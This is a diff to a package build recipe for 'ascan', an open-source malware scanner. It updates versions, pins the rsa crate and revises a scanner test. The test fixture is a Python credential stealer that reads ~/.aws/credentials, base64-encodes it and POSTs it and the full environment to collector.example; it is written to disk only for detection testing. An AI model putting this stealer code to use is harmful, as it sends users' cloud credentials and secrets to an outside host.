@@ -2,7 +2,7 @@
 package:
   name: ascan
   version: "2.13.0"
-  epoch: 2 # CVE-2026-115893
+  epoch: 3 # CVE-2026-115893
   description: "Open-source malware detection for the AI age"
   copyright:
     - license: Apache-2.0
@@ -38,7 +38,7 @@ pipeline:
     with:
       repository: https://github.com/atomdrift-project/scan
       tag: v${{package.version}}
-      expected-commit: 5efed4de9745ce3e8ed69bfdc1a6d11774278206
+      expected-commit: 34c5f57b2a2366d7b1559e64d59836f2ba2acc10
 
   - uses: bump
     with:
@@ -50,8 +50,13 @@ pipeline:
   # yara-x 1.21 (wasmtime ^45.0.3), so bump cannot raise it. yara-x 1.22.1
   # requires wasmtime ^48.0.6, which resolves to a fixed crates.io release
   # (>= 48.0.7) and leaves the 45.0.3 fork patch unused.
+  # yara-x 1.22.1 requires rsa ^0.10.0-rc.19 and relies on the Pkcs1v15Sign
+  # export that rc.19 had unconditionally. Cargo resolves that to the final
+  # rsa 0.10.0, which moved it behind the non-default `pkcs1v15` feature, so
+  # yara-x fails to compile. Hold rsa at rc.19 until yara-x enables the feature.
   - runs: |
       cargo update -p yara-x@1.21.0 --precise 1.22.1
+      cargo update -p rsa@0.10.0 --precise 0.10.0-rc.19
       if awk '/^\[\[/ { pkg = ($0 == "[[package]]") } pkg && /^name = "wasmtime"$/ { getline; print }' Cargo.lock | grep -qE 'version = "(4[0-7]\.|48\.0\.[0-6]")'; then
         echo "vulnerable wasmtime still in Cargo.lock"
         exit 1
@@ -170,21 +175,26 @@ test:
         grep -E "files|clean" /tmp/benign_output.txt
     - name: "Scan a suspicious script"
       runs: |
-        # Use a credential-stealer payload from the atomdrift-project/traits
-        # simple-stealer corpus (08-linux-aws-credentials.py). It reads
-        # ~/.aws/credentials and POSTs the contents to a remote host, which
-        # is flagged hostile by the rule-based "uploads credential contents
-        # via HTTP" finding. Since 2.12 the shell variants of this corpus
-        # (e.g. 01-linux-aws-env-curl.sh) no longer clear the stricter
-        # trait-floor corroboration requirements and scan clean. This file
-        # is only written to disk and scanned — never executed.
+        # Credential stealer: reads ~/.aws/credentials, base64-encodes it and
+        # POSTs it to a remote host, then POSTs the whole environment too.
+        # This is flagged hostile by the rule-based "credential-file
+        # contents sent in an HTTP body" finding. Since 2.12 the shell
+        # variants of the atomdrift-project/traits simple-stealer corpus no
+        # longer clear the stricter trait-floor corroboration requirements
+        # and scan clean, and the v2.13.0 retag also stopped flagging the
+        # single-POST variant (08-linux-aws-credentials.py), so the payload
+        # needs the encoded upload plus the environment exfiltration. This
+        # file is only written to disk and scanned — never executed.
         tee /tmp/suspicious.py <<'SCRIPT'
         #!/usr/bin/env python3
-        from pathlib import Path
+        import os
+        import base64
         import requests
+        from pathlib import Path
 
         creds = Path.home() / ".aws/credentials"
-        requests.post("https://collector.example/aws", data=creds.read_text())
+        requests.post("https://collector.example/aws", data=base64.b64encode(creds.read_bytes()))
+        requests.post("https://collector.example/env", json=dict(os.environ))
         SCRIPT
         rc=0
         atomscan fs /tmp/suspicious.py >/tmp/suspicious_output.txt 2>&1 || rc=$?
